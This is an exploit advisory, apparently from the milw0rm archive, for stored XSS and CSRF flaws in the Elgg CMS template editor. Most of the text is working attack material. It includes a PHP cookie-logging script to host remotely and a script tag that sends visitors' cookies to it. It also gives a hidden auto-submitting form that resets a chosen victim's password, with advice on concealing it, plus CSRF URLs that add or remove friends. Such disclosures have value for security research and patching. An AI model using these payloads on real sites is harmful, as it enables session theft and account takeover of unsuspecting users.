<html><head><title>Elgg (XSS/CSRF/Change Password) Multiple Remote Vulnerabilities</title></head><pre>###################################################################################
[+] CMS Elgg &lt;1.00 (XSS;CSRF;Cambia Password)Multiple Remote Vulnerabilities
[+] Discovered By ThE Lorddemon  lorddemon@zonartm.org
[+] Vendor:http://elgg.org/
[+] Greetings: Project MEMI-Bolivia, OpTix, RTM security Group http://zonartm.og
###################################################################################
	
Change Password Remotely:
+++++++++++++++++++++++++
1) You Must Register In ThE site.
2) Login
3) Create a new topic and then edit
	http://www.sitiosocial.com/_templates/
 	
Edit the new topic (Template) have the option to insert HTML, JavaScript
##################################################################################
Exploit&amp; HTML Injection

###Cookie Grabber#### 
[+] Discovered By ThE Lorddemon
[+] Vendor:http://elgg.org/
##################################################################################
PoC
--
Script to store cookies
 &lt;?php
 $cookie = $_GET['cookie'];
 $log = fopen(&quot;log.txt&quot;, &quot;a&quot;);
 fwrite($log, $cookie .&quot;\n&quot;);
 fclose($log);
 ?&gt;
uploading to a host.Save as cookie.php

[+]Exploit:
   -------
1) Register in The SIte
2) add to the Template
&lt;script language='Javascript' src='http://localhost/cookie.php?cookie='+document.cooke&gt;&lt;/script&gt;

The victim would be anyone who comes to your blog.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
###Change Pasword#### 
[+] Discovered By ThE Lorddemon lorddemon@zonartm.org 
[+] http://zonartm.org
[+] Vendor:http://elgg.org/
#######################################################################################################

1) Register in The SIte
2) add to the Template

&lt;body onload=&quot;document.forms.g.submit();&quot;&gt;

&lt;iframe name=&quot;my_frame&quot; ALING=&quot;BOTTOM&quot;  scrolling=no width=1 heigth=1&gt;&lt;/iframe&gt;

&lt;form method=&quot;POST&quot; target=&quot;my_frame&quot; action=&quot;http://www.sitiosocial.com/_userdetails/index.php&quot; name=&quot;g&quot; id=&quot;g&quot;&gt;
&lt;input type=hidden name=&quot;name&quot; value=&quot;&quot;&gt;
&lt;input type=hidden name=&quot;email&quot; value=&quot;&quot;&gt;
&lt;input type=hidden name=&quot;moderation&quot; value=&quot;no&quot;&gt;
&lt;input type=hidden name=&quot;publiccoments&quot; value=&quot;no&quot;&gt;
&lt;input type=hidden name=&quot;receivenotifications&quot; value=&quot;no&quot;&gt;
&lt;input type=hidden name=&quot;password1&quot; value=&quot;password&quot;&gt;   &lt;------ Eye with this
&lt;input type=hidden name=&quot;password2&quot; value=&quot;password&quot;&gt;   &lt;------ Eye with this
&lt;input type=hidden name=&quot;flag[commentwall_access]&quot; value=&quot;LOGGED_IN&quot;&gt;
&lt;input type=hidden name=&quot;lang&quot; value=&quot;&quot;&gt;
&lt;input type=hidden name=&quot;flag[sidebarsidebar-profile]&quot; value=&quot;yes&quot;&gt;
&lt;input type=hidden name=&quot;flag[sidebarsidebar-communities]&quot; value=&quot;yes&quot;&gt;
&lt;input type=hidden name=&quot;flag[sidebarsidebar-blog]&quot; value=&quot;yes&quot;&gt;
&lt;input type=hidden name=&quot;flag[sidebarsidebar-friends]&quot; value=&quot;yes&quot;&gt;
&lt;input type=hidden name=&quot;visualeditor&quot; value=&quot;yes&quot;&gt;
&lt;input type=hidden name=&quot;action&quot; value=&quot;userdetails:update&quot;&gt;
&lt;input type=hidden name=&quot;id&quot; value=&quot;id_victima&quot;&gt;               &lt;---------Eye with this
&lt;input type=hidden name=&quot;profile_id&quot; value=&quot;id_victima&quot;&gt;       &lt;---------Eye with this
&lt;/form&gt;
	 	
It is better to send all the form inside a Div tag to pass unnoticed
	
The victim would be the user with the id.
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
###You Be More Popular, or remove the victim to Friends#### 
[+] Discovered By ThE Lorddemon lorddemon@zonartm.org 
[+] http://zonartm.org
[+] Vendor:http://elgg.org/
#################################################################################################################

1) Register in The SIte
2) Add to the Template

http://www.sitioSocial.com/mod/friend/index.php?friends_name=[vacio]&amp;action=friend&amp;friend_id=[tu id]

viewing parameters from the viewpoint of the attacker.

Friends_name=is the user name who made you want to be your friend. (may be empty)
Action= friend or unfriend.
Friend_id=User ID. who is performing the action
	
You can also remove it with friends cuanquier user.

http://www.sitioSocial.com/mod/friend/index.php?friends_name=[vacio]&amp;action=Unfriend&amp;friend_id=[id_victima]

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# milw0rm.com [2009-06-22]</pre></html>